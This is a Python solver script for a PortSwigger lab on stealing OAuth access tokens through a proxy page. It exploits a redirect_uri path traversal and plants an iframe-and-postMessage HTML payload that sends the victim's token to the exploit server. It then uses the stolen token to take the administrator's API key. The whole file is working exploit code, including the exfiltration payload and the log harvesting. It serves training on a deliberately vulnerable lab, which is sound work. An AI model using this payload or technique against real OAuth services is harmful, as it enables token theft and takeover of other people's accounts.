#!/usr/bin/env python3
"""Solve PortSwigger's "Stealing OAuth access tokens via a proxy page" (Expert).

The OAuth service validates ``redirect_uri`` with a naive prefix/whitelist check
that a path-traversal sequence defeats, so the token-bearing redirect can be
pointed at any page on the client application.  The client's comment form
(``/post/comment/comment-form``) is a "proxy page": on load it does
``parent.postMessage({type:'onload', data: window.location.href}, '*')``, which
hands the whole URL -- including the ``#access_token=...`` fragment -- to
whatever framed it.  Framing the OAuth authorize endpoint therefore leaks the
victim administrator's token to the exploit server, and ``GET /me`` on the
OAuth server returns that user's API key.

Usage:
    uv run python solve.py --url "https://<lab-id>.web-security-academy.net/"

Everything instance-specific (hosts, client_id, nonce, token, API key, session
cookies) is discovered at runtime; nothing is pinned to one lab instance.

Exit codes: 0 = solved and verified, 1 = exploit failed, 3 = wrong/expired lab.
"""
from __future__ import annotations

import argparse
import html
import json
import random
import re
import sys
import time
import urllib.parse
from pathlib import Path

import requests

TITLE = "Stealing OAuth access tokens via a proxy page"
TIMEOUT = 20
HERE = Path(__file__).resolve().parent
TOKEN_RE = re.compile(r"access_token(?:%3D|=)([A-Za-z0-9_\-]{10,})")


def victim_lines(log: str) -> list[str]:
    """Exploit-server access-log lines produced by the lab's victim browser."""
    return [ln for ln in log.splitlines() if "(Victim)" in ln]


def extract_leaked_token(log: str, baseline: int = 0) -> str | None:
    """Pull a token out of the access-log lines appended after `baseline`.

    `baseline` is the log's line count recorded just before the delivery, so a
    token left over from an earlier run can never be reported as a fresh steal.
    The solver's own requests are skipped by user agent.
    """
    for line in reversed(log.splitlines()[baseline:]):
        if "lab-solver" in line.lower():
            continue
        m = TOKEN_RE.search(urllib.parse.unquote(line))
        if m:
            return m.group(1)
    return None


class Solver:
    def __init__(self, url: str, *, keep_evidence: bool = True,
                 exploit_url: str | None = None) -> None:
        self.base = url.rstrip("/")
        self.s = requests.Session()
        self.s.headers["User-Agent"] = "Mozilla/5.0 (compatible; lab-solver)"
        self.requests = 0
        self.started = time.monotonic()
        self.keep = keep_evidence
        self.exploit_url = (exploit_url or "").strip() or None
        self.exploit = ""
        self.oauth = ""
        self.client_id = ""
        self.scope = "openid profile email"
        self.token: str | None = None
        self.apikey: str | None = None
        self.log_baseline = 0
        for d in ("requests", "responses", "evidence", "logs"):
            (HERE / d).mkdir(parents=True, exist_ok=True)

    # ---------------------------------------------------------------- helpers
    def req(self, method: str, url: str, *, follow: bool = False, **kw) -> requests.Response:
        kw.setdefault("timeout", TIMEOUT)
        kw.setdefault("allow_redirects", follow)
        self.requests += 1
        n = self.requests
        try:
            r = self.s.request(method, url, **kw)
        except requests.RequestException as e:
            print(f"    ! {method} {url} -> {e}")
            raise
        tag = re.sub(r"[^A-Za-z0-9]+", "_", urllib.parse.urlsplit(url).path)[:60] or "root"
        if self.keep:
            (HERE / "requests" / f"{n:03d}_{method}_{tag}.txt").write_text(
                f"{method} {url}\n\n" + "\n".join(f"{k}: {v}" for k, v in kw.get("data", {}).items()
                                                  if isinstance(kw.get("data"), dict)))
            (HERE / "responses" / f"{n:03d}_{method}_{tag}.http").write_text(
                f"HTTP {r.status_code}\n" + "\n".join(f"{k}: {v}" for k, v in r.headers.items())
                + "\n\n" + r.text)
        return r

    def head(self) -> requests.Response:
        return self.req("GET", self.base + "/?cachebust=%d" % random.randint(10**6, 10**7), follow=True)

    # ------------------------------------------------------------- discovery
    def verify_lab(self) -> bool:
        r = self.head()
        if r.status_code != 200 or TITLE.lower() not in r.text.lower():
            print(f"[-] Not the expected lab (HTTP {r.status_code}, title mismatch) - refusing to run.")
            return False
        print(f"[+] Lab verified: {TITLE}")
        m = re.search(r"id=['\"]exploit-link['\"][^>]*href=['\"]([^'\"]+)", r.text)
        if not m:
            m = re.search(r"href=['\"](https://[^'\"]+\.exploit-server\.net)['\"]", r.text)
        if m:
            self.exploit = html.unescape(m.group(1)).rstrip("/")
        elif self.exploit_url:
            self.exploit = self.exploit_url.rstrip("/")
        else:
            # A solved lab hides its banner link; reuse the URL cached by an earlier run.
            cache = HERE / "evidence" / "exploit-server-url.txt"
            if cache.is_file():
                self.exploit = cache.read_text().strip().rstrip("/")
                print(f"[+] Exploit server (cached from a previous run): {self.exploit}")
        if self.exploit:
            (HERE / "evidence").mkdir(parents=True, exist_ok=True)
            (HERE / "evidence" / "exploit-server-url.txt").write_text(self.exploit + "\n")
            print(f"[+] Exploit server: {self.exploit}")
        else:
            print("[!] Exploit server URL not on the page (lab already solved hides it); "
                  "pass --exploit-url to re-run the exploit.")
        return True

    def is_solved(self) -> bool:
        return "widgetcontainer-lab-status is-solved" in self.head().text

    def discover_oauth(self) -> None:
        """Read /social-login, follow the meta refresh target, parse the OAuth params."""
        r = self.req("GET", self.base + "/social-login", follow=True)
        m = re.search(r"content='\d+;\s*url=([^']+)'", r.text)
        if not m:
            m = re.search(r'http-equiv=["\']refresh["\'][^>]*content=["\'][^"\']*url=([^"\']+)', r.text, re.I)
        if not m:
            raise RuntimeError("no OAuth redirection found on /social-login")
        auth_url = html.unescape(m.group(1)).strip()
        sp = urllib.parse.urlsplit(auth_url)
        self.oauth = f"{sp.scheme}://{sp.netloc}"
        q = urllib.parse.parse_qs(sp.query)
        self.client_id = q["client_id"][0]
        self.scope = q.get("scope", ["openid profile email"])[0]
        self.auth_path = sp.path
        print(f"[+] OAuth server  : {self.oauth}")
        print(f"[+] client_id     : {self.client_id}   scope={self.scope!r}")

    def probe_redirect_uri(self, candidate: str) -> str:
        """Return 'accepted' / 'rejected' for a redirect_uri value (fresh cookie jar)."""
        sess = requests.Session()
        sess.headers["User-Agent"] = self.s.headers["User-Agent"]
        nonce = str(random.randint(10**9, 10**10 - 1))
        url = (f"{self.oauth}{self.auth_path}?client_id={self.client_id}"
               f"&redirect_uri={candidate}&response_type=token&nonce={nonce}"
               f"&scope={urllib.parse.quote(self.scope)}")
        self.requests += 1
        r = sess.get(url, timeout=TIMEOUT, allow_redirects=True)
        if self.keep:
            (HERE / "experiments").mkdir(exist_ok=True)
            (HERE / "experiments" / "redirect_uri_probe.txt").write_text(
                f"redirect_uri: {candidate}\nHTTP {r.status_code}\nfinal: {r.url}\n\n{r.text[:4000]}")
        accepted = r.status_code == 200 and re.search(r'action="[^"]+/(login|confirm)"', r.text)
        if accepted:
            return "accepted"
        if r.status_code in (301, 302, 303, 307):
            return "accepted"
        return "rejected"

    # --------------------------------------------------------------- payload
    def build_payload(self) -> str:
        redirect_uri = f"{self.base}/oauth-callback/../post/comment/comment-form"
        state = self.probe_redirect_uri(redirect_uri)
        print(f"[+] redirect_uri traversal ({redirect_uri}) -> {state}")
        if state != "accepted":
            raise RuntimeError("OAuth service rejected the traversal redirect_uri on this instance")
        nonce = str(random.randint(10**9, 10**10 - 1))
        iframe = (f"{self.oauth}{self.auth_path}?client_id={self.client_id}"
                  f"&redirect_uri={redirect_uri}&response_type=token&nonce={nonce}"
                  f"&scope={urllib.parse.quote(self.scope)}")
        payload = (
            "<script>\n"
            "window.addEventListener('message', function(e) {\n"
            "  try { fetch('/?d=' + encodeURIComponent(JSON.stringify(e.data)), {mode:'no-cors'}); } catch (x) {}\n"
            "}, false);\n"
            "</script>\n"
            f'<iframe src="{iframe}" style="width:1px;height:1px;border:0"></iframe>\n'
        )
        (HERE / "experiments").mkdir(exist_ok=True)
        (HERE / "experiments" / "payload.html").write_text(payload)
        return payload

    def store_and_deliver(self, payload: str) -> None:
        head = "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8"
        data = {"urlIsHttps": "on", "responseFile": "/exploit", "responseHead": head,
                "responseBody": payload}
        r = self.req("POST", self.exploit + "/", data={**data, "formAction": "STORE"})
        print(f"[+] Stored exploit on /exploit (HTTP {r.status_code})")
        # Remember where the log ended so a stale token is never reused.
        self.log_baseline = len(self.access_log().splitlines())
        r = self.req("POST", self.exploit + "/", data={**data, "formAction": "DELIVER_TO_VICTIM"})
        # The form answers 302 -> /deliver-to-victim; the bot is only triggered by that follow-up GET.
        loc = r.headers.get("Location", "")
        if r.status_code in (301, 302, 303, 307) and loc:
            target = loc if loc.startswith("http") else self.exploit + "/" + loc.lstrip("/")
            r = self.req("GET", target, follow=True)
        print(f"[+] Delivered exploit to the victim (HTTP {r.status_code})")

    # -------------------------------------------------------------- harvest
    def access_log(self) -> str:
        r = self.req("GET", self.exploit + "/log")
        m = re.search(r"<pre[^>]*>(.*?)</pre>", r.text, re.S)
        return html.unescape(m.group(1)) if m else r.text

    def harvest_token(self, timeout: float = 60.0) -> str | None:
        """Poll the exploit access log for this delivery's leak.

        Only victim requests logged *after* the delivery are accepted, so a token
        left over from an earlier run can never be mistaken for a fresh steal.
        """
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            log = self.access_log()
            tok = extract_leaked_token(log, self.log_baseline)
            if tok:
                self.token = tok
                (HERE / "evidence" / "leaked-access-log.txt").write_text(log)
                print(f"[+] Leaked access token from victim request: {tok[:12]}...({len(tok)} chars)")
                return tok
            time.sleep(2)
        print("[-] No fresh token appeared in the exploit server access log.")
        (HERE / "evidence" / "access-log-no-token.txt").write_text(self.access_log())
        return None

    # ------------------------------------------------------------- token use
    def me(self, token: str) -> dict | None:
        r = self.req("GET", self.oauth + "/me",
                     headers={"Authorization": "Bearer " + token, "Accept": "application/json"})
        if r.status_code != 200:
            print(f"    ! /me returned HTTP {r.status_code}")
            return None
        try:
            return r.json()
        except ValueError:
            return None

    def submit(self, apikey: str) -> bool:
        r = self.req("POST", self.base + "/submitSolution", data={"answer": apikey},
                     headers={"Content-Type": "application/x-www-form-urlencoded"})
        print(f"[+] submitSolution -> HTTP {r.status_code} {r.text.strip()[:80]}")
        try:
            return bool(r.json().get("correct"))
        except ValueError:
            return '"correct":true' in r.text.replace(" ", "")

    # ------------------------------------------------------------------ main
    def run(self, *, force: bool = False, attempts: int = 3) -> int:
        if not self.verify_lab():
            return 3
        if self.is_solved() and not force:
            print("[+] Lab already reports is-solved; nothing to do (use --force to re-run the exploit).")
            return 0
        if not self.exploit:
            print("[-] No exploit server URL available for this run.")
            return 3
        self.discover_oauth()

        for attempt in range(1, attempts + 1):
            print(f"\n--- attempt {attempt}/{attempts} ---")
            payload = self.build_payload()
            self.store_and_deliver(payload)
            token = self.harvest_token(timeout=45)
            if not token:
                continue
            info = self.me(token)
            if not info:
                continue
            print(f"[+] Token belongs to: {info.get('sub')} <{info.get('email')}>")
            if info.get("sub") != "administrator":
                print("[-] Not the administrator token; retrying.")
                continue
            self.apikey = info.get("apikey")
            if not self.apikey:
                print("[-] /me returned no apikey field; retrying.")
                continue
            print(f"[+] Administrator API key: {self.apikey[:6]}...")
            if self.submit(self.apikey):
                time.sleep(1)
                if self.is_solved():
                    print("[+] Verified: lab status widget reports is-solved.")
                    return 0
                print("[-] submitSolution said correct but the widget is not solved yet; re-checking.")
                for _ in range(5):
                    time.sleep(2)
                    if self.is_solved():
                        print("[+] Verified: lab status widget reports is-solved.")
                        return 0
                return 1
        print("[-] Exploit did not complete.")
        return 1

    def summary(self, code: int) -> None:
        elapsed = time.monotonic() - self.started
        line = (f"exit={code} requests={self.requests} elapsed_seconds={elapsed:.2f} "
                f"solved={self.is_solved()} token_len={len(self.token or '')} apikey={bool(self.apikey)}")
        print(f"[i] {line}")
        (HERE / "logs").mkdir(exist_ok=True)
        (HERE / "logs" / "solve.log").open("a").write(time.strftime("[%Y-%m-%d %H:%M:%S] ") + line + "\n")
        (HERE / "evidence" / "run-summary.json").write_text(json.dumps({
            "exit_code": code, "requests": self.requests, "elapsed_seconds": round(elapsed, 2),
            "solved": self.is_solved(), "token_length": len(self.token or ""),
            "apikey_captured": bool(self.apikey)}, indent=2))
        (HERE / "evidence" / f"run-summary-{int(time.time())}.json").write_text(json.dumps({
            "exit_code": code, "requests": self.requests, "elapsed_seconds": round(elapsed, 2),
            "solved": self.is_solved(), "token_length": len(self.token or ""),
            "apikey_captured": bool(self.apikey)}, indent=2))


def self_test() -> int:
    """Offline check of the log parser: stale tokens must never be reported as fresh."""
    stale = ('10.0.4.165 2026-10-26 16:22:29 +0000 "GET /?d=%7B%22type%22%3A%22onload%22%2C%22data%22'
             '%3A%22https%3A%2F%2Flab%2Fpost%2Fcomment%2Fcomment-form%23access_token%3DSTALEtoken1234567'
             '%26expires_in%3D3600%22%7D HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) Chrome/154.0"')
    fresh = stale.replace("STALEtoken1234567", "FRESHtoken7654321")
    mine = ('139.179.199.229 2026-10-26 16:25:41 +0000 "GET /log HTTP/1.1" 200 '
            '"User-Agent: Mozilla/5.0 (compatible; lab-solver)"')
    log = "\n".join([mine, stale, mine, fresh, mine])
    checks = [
        ("stale entry is not reported once the log has advanced", extract_leaked_token(log, 4) is None),
        ("new leak after baseline is picked up", extract_leaked_token(log, 2) == "FRESHtoken7654321"),
        ("solver's own log lines are ignored", extract_leaked_token(mine, 0) is None),
        ("baseline 0 falls back to the newest leak", extract_leaked_token(log, 0) == "FRESHtoken7654321"),
        ("victim line count", len(victim_lines(log)) == 2),
    ]
    ok = True
    for name, passed in checks:
        print(f"[{'PASS' if passed else 'FAIL'}] {name}")
        ok &= passed
    return 0 if ok else 1


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url", help="Lab instance URL")
    ap.add_argument("--exploit-url", help="Exploit-server URL override (normally auto-discovered)")
    ap.add_argument("--force", action="store_true", help="Re-run even if the lab already reports solved")
    ap.add_argument("--attempts", type=int, default=3, help="Delivery attempts (default 3)")
    ap.add_argument("--no-evidence", action="store_true", help="Do not persist request/response dumps")
    ap.add_argument("--self-test", action="store_true", help="Run offline parser checks and exit")
    args = ap.parse_args()

    if args.self_test:
        return self_test()
    if not args.url:
        ap.error("--url is required (or use --self-test)")

    solver = Solver(args.url, keep_evidence=not args.no_evidence, exploit_url=args.exploit_url)
    code = 1
    try:
        code = solver.run(force=args.force, attempts=args.attempts)
    except Exception as e:  # noqa: BLE001
        print(f"[-] fatal: {e}")
        code = 1
    finally:
        solver.summary(code)
    return code


if __name__ == "__main__":
    sys.exit(main())
